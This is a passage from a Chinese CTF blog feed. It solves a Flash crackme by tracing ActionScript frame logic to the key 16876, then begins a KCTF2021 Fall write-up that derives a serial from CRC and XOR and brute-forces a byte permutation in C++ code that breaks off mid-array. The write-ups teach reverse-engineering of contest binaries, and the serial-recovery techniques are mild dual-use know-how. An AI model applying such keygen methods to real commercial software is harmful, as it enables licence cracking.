&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-actionscript&#34; data-lang=&#34;actionscript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// frame1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;release&lt;/span&gt;){
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;spw&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1456&lt;/span&gt;)
   {
      &lt;span style=&#34;color:#a6e22e&#34;&gt;gotoAndPlay&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
   }
   &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
   {
      &lt;span style=&#34;color:#a6e22e&#34;&gt;_root&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;spw&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
   }
}

&lt;span style=&#34;color:#75715e&#34;&gt;// frame2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;release&lt;/span&gt;){
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
   {
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spw&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;gotoAndPlay&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;);
   }
}

&lt;span style=&#34;color:#75715e&#34;&gt;// frame3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;release&lt;/span&gt;){
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;)
   {
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spw&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;gotoAndPlay&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
   }
}

&lt;span style=&#34;color:#75715e&#34;&gt;// frame4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;release&lt;/span&gt;){
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;)
   {
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spw&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;gotoAndPlay&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
   }
}

&lt;span style=&#34;color:#75715e&#34;&gt;// frame5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;release&lt;/span&gt;){
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20546&lt;/span&gt;)
   {
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spw&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;gotoAndPlay&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;);
   }
}

&lt;span style=&#34;color:#75715e&#34;&gt;// frame6
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;release&lt;/span&gt;){
   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;)
   {
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spw&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;spwd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;gotoAndPlay&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);
   }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;gotoAndPlay&lt;/code&gt; 中的数字为帧数&lt;/p&gt;
&lt;p&gt;所以输入的顺序为 1456, 25, 44, 8, 88, 20546&lt;/p&gt;
&lt;p&gt;因为不想装 flash，所以想自己写脚本把这个结果算出来，但是发现怎么算都不对&lt;/p&gt;
&lt;p&gt;最后发现原因是 flash 是用字符串进行的计算，猜测 flash 中 &lt;code&gt;&amp;quot;1&amp;quot; == 1&lt;/code&gt;，需要根据运算符猜测是字符串运算还是整数运算还是浮点数运算&lt;/p&gt;
&lt;p&gt;一个能得出正确答案的计算过程（加法为字符串拼接，除法保留小数）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1456&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;36400&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3640044&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;455005.5&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3640044&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;40040484.0&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3640044&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20546&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;16876.0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;16876 就是 key&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Two Challenges in KCTF2021 Fall</title>
        <link>/post/two-challenges-in-kctf2021-fall/</link>
        <pubDate>Thu, 23 Dec 2021 22:23:17 +0800</pubDate>
        
        <guid>/post/two-challenges-in-kctf2021-fall/</guid>
        <description>&lt;img src="/post/two-challenges-in-kctf2021-fall/cover.jpg" alt="Featured image of post Two Challenges in KCTF2021 Fall" /&gt;&lt;p&gt;有些题还是很值得补的，最近没什么时间，假期补吧（&lt;/p&gt;
&lt;h2 id=&#34;第一题-签到&#34;&gt;第一题 签到&lt;/h2&gt;
&lt;p&gt;这题还是比较容易的，需要一点点动调的经验&lt;/p&gt;
&lt;p&gt;上张队友的截图吧，懒得自己截了&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 392; 
			flex-basis: 942px&#34;
	&gt;
	&lt;a href=&#34;/post/two-challenges-in-kctf2021-fall/checkin.jpg&#34; data-size=&#34;660x168&#34;&gt;
		&lt;img src=&#34;/post/two-challenges-in-kctf2021-fall/checkin.jpg&#34;
			width=&#34;660&#34;
			height=&#34;168&#34;
			srcset=&#34;/post/two-challenges-in-kctf2021-fall/checkin_hue08618e613484fc15c0d0d318160d905_17847_480x0_resize_q75_box.jpg 480w, /post/two-challenges-in-kctf2021-fall/checkin_hue08618e613484fc15c0d0d318160d905_17847_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;动调看看内存就知道，流程是：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;serial-&amp;gt;十进制-&amp;gt;与name的crc异或-&amp;gt;计算crc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后需要是一个固定的值，于是只需要想办法反解就行了&lt;/p&gt;
&lt;p&gt;这里注意到了一个事情，那就是图中看似是对 v6 的 crc 结果做了约束，其实是对 v6 本身进行了约束&lt;/p&gt;
&lt;p&gt;由于题目给了一个实例的 name 和 serial，我们只需要动调拿到这个的 v6，就知道能通过验证的 v6 是多少了&lt;/p&gt;
&lt;p&gt;接下来动调拿一下 &lt;code&gt;KCTF&lt;/code&gt; 的 crc，这个的结果再异或一下目标的 v6，就得到serial了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;靠记忆写的，希望没错&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;第二题-迷失丛林&#34;&gt;第二题 迷失丛林&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;这题就直接放提交的wp了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很容易定位到程序的输入&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 202; 
			flex-basis: 486px&#34;
	&gt;
	&lt;a href=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013038950.png&#34; data-size=&#34;912x450&#34;&gt;
		&lt;img src=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013038950.png&#34;
			width=&#34;912&#34;
			height=&#34;450&#34;
			srcset=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013038950_hu85d35b97083a4f18efd8b87e222d059e_54919_480x0_resize_box_3.png 480w, /post/two-challenges-in-kctf2021-fall/image-20211117013038950_hu85d35b97083a4f18efd8b87e222d059e_54919_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输入长度为32，需要通过 &lt;code&gt;sub_4014A0&lt;/code&gt;, &lt;code&gt;sub_401580&lt;/code&gt; 的验证&lt;/p&gt;
&lt;p&gt;&lt;code&gt;4014A0&lt;/code&gt; 较为简单，是个经典的hexstr转成char存到 &lt;code&gt;4041F0&lt;/code&gt; 这个地址，最后的16是计算转换后的长度，所以输入就是 &lt;code&gt;[0-9A-F]{32}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;随后将输入的前八字节存入 &lt;code&gt;404000&lt;/code&gt; 中，剩下的部分传参进 &lt;code&gt;sub_401580&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要想让该函数返回1，需要先通过如下的if验证&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 221; 
			flex-basis: 532px&#34;
	&gt;
	&lt;a href=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013351047.png&#34; data-size=&#34;1303x587&#34;&gt;
		&lt;img src=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013351047.png&#34;
			width=&#34;1303&#34;
			height=&#34;587&#34;
			srcset=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013351047_hu892559e3a0661b25bb9d9447f892b5b0_47215_480x0_resize_box_3.png 480w, /post/two-challenges-in-kctf2021-fall/image-20211117013351047_hu892559e3a0661b25bb9d9447f892b5b0_47215_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;简单看一下使用的变量，应该是对前八字节的输入进行的验证&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 54; 
			flex-basis: 130px&#34;
	&gt;
	&lt;a href=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013516722.png&#34; data-size=&#34;942x1727&#34;&gt;
		&lt;img src=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013516722.png&#34;
			width=&#34;942&#34;
			height=&#34;1727&#34;
			srcset=&#34;/post/two-challenges-in-kctf2021-fall/image-20211117013516722_hu06b52fdfc89a64205e2555f46bb80ce1_122804_480x0_resize_box_3.png 480w, /post/two-challenges-in-kctf2021-fall/image-20211117013516722_hu06b52fdfc89a64205e2555f46bb80ce1_122804_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;结合动调发现大概就是根据404000数组，构成一个 &lt;code&gt;&amp;lt;value, index&amp;gt;&lt;/code&gt; 的结构，两两存放到404420当中&lt;/p&gt;
&lt;p&gt;分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 &lt;code&gt;0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb&lt;/code&gt; 中，总共有 $8!=40320$ 种可能，完全可以爆破&lt;/p&gt;
&lt;p&gt;把ida代码复制下来改一改&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; byte_404000[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9B&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDD&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x92&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x88&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x85&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCC&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4F&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3B&lt;/span&gt;, 
